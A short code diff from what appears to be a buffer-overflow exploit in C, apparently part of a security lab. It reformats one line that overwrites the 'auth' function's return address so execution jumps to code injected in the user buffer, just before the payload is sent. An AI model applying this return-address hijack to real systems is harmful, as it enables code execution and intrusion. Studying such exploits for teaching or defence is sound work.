@@ -213,8 +213,7 @@ int main(int argc, char* argv[]) {
    // Set ulen (3 words past bp) to zero so strncmp doesn't segfault
    expl[auth_bp_loc_user_diff + 3/sizeof(void*)] = 0;
    // Change auth's RA to the address where we injected our code (addr of user)
-   expl[auth_ra_user_diff/sizeof(void*)] = 
-      (void*)cur_user_addr;
+   expl[auth_ra_user_diff/sizeof(void*)] = (void*)cur_user_addr;
 
    // Now, send the payload
    put_str("p xyz\n");
